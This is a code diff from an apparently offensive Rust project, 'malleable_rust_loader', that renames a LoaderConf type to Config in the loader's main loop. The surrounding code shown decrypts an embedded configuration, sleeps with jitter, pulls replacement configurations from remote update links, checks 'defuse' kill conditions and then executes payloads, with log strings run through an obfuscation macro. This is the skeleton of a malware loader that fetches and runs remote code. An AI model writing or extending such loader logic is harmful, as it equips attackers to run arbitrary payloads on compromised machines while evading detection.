@@ -1,5 +1,5 @@
 use malleable_rust_loader::link::LinkFetch;
-use malleable_rust_loader::loaderconf::LoaderConf;
+use malleable_rust_loader::config::Config;
 use std::{thread, time};
 
 #[macro_use]
@@ -51,10 +51,10 @@ fn main() {
     let decrypted_conf = un_apply_all_dataoperations(dataoperation, loader_conf_encrypted).unwrap();
     info!("{}", lc!("[+] DECRYPTED!"));
 
-    let mut loaderconf: LoaderConf = serde_json::from_slice(decrypted_conf.as_slice()).unwrap();
+    let mut config: Config = serde_json::from_slice(decrypted_conf.as_slice()).unwrap();
     info!("{}", lc!("[+] VERIFY initial config"));
-    debug!("{:?}", &loaderconf);
-    loaderconf.verify_newloader_sign(&loaderconf).unwrap();
+    debug!("{:?}", &config);
+    config.verify_newloader_sign(&config).unwrap();
     info!("{}{}", lc!("[+] VERIFIED!"), "\n");
 
     let mut loop_nb = 1;
@@ -65,25 +65,25 @@ fn main() {
             loop_nb,
             lc!(" --------------------------------------------------------")
         );
-        info!("{}{:?}", lc!("[+] Active LOADER: "), loaderconf);
-        loaderconf.print_loader_without_sign_material();
-        loaderconf.sleep_and_jitt();
+        info!("{}{:?}", lc!("[+] Active LOADER: "), config);
+        config.print_loader_without_sign_material();
+        config.sleep_and_jitt();
 
         info!("{}", lc!("[+] DEFUSE RELOAD config"));
-        if loaderconf.stop_defuse(&loaderconf.defuse_update) {
+        if config.stop_defuse(&config.defuse_update) {
             error!("{}", lc!("[!] DEFUSE STOP reload config"));
         } else {
             let mut nb_config = 0;
             let mut change_loader = false;
-            let mut replacement_loaderconf: LoaderConf = LoaderConf::new_empty();
+            let mut replacement_loaderconf: Config = Config::new_empty();
             info!("{}", lc!("[+] RELOAD config"));
 
-            for conflink in &loaderconf.loaderconf_update_links {
+            for conflink in &config.update_links {
                 nb_config = nb_config + 1;
                 info!(
                     "{}/{}{}{:?}",
                     nb_config,
-                    &loaderconf.loaderconf_update_links.len(),
+                    &config.update_links.len(),
                     lc!(" config link: "),
                     &conflink
                 );
@@ -96,7 +96,7 @@ fn main() {
                     }
                 };
                 debug!("{}", lc!("deserialized data"));
-                let newloader: LoaderConf = match serde_json::from_slice(&data) {
+                let newloader: Config = match serde_json::from_slice(&data) {
                     Ok(newloader) => newloader,
                     Err(error) => {
                         warn!("{}{}", lc!("error: "), error);
@@ -105,7 +105,7 @@ fn main() {
                 };
                 debug!("{}", lc!("new loader downloaded:"));
                 newloader.print_loader_compact();
-                let verified = match loaderconf.verify_newloader_sign(&newloader) {
+                let verified = match config.verify_newloader_sign(&newloader) {
                     Ok(()) => true,
                     _unspecified => false,
                 };
@@ -115,7 +115,7 @@ fn main() {
                     warn!("{}{}", lc!("verify signature: "), verified);
                 }
                 if verified {
-                    let is_same_loader = loaderconf.is_same_loader(&newloader);
+                    let is_same_loader = config.is_same_loader(&newloader);
                     if is_same_loader {
                         info!("{}{}", lc!("same loader: "), is_same_loader);
                     } else {
@@ -145,15 +145,15 @@ fn main() {
 
             if change_loader {
                 info!("{}", lc!("[+] LOADER replaced"));
-                loaderconf = replacement_loaderconf;
+                config = replacement_loaderconf;
             }
 
             info!("{}", lc!("[+] DEFUSE payload exec"));
-            if loaderconf.stop_defuse(&loaderconf.defuse_payload) {
+            if config.stop_defuse(&config.defuse_payload) {
                 error!("{}", lc!("[!] DEFUSE STOP the payload exec"));
             } else {
                 info!("{}", lc!("[+] PAYLOADS exec"));
-                loaderconf.exec_payloads();
+                config.exec_payloads();
             }
         }
 
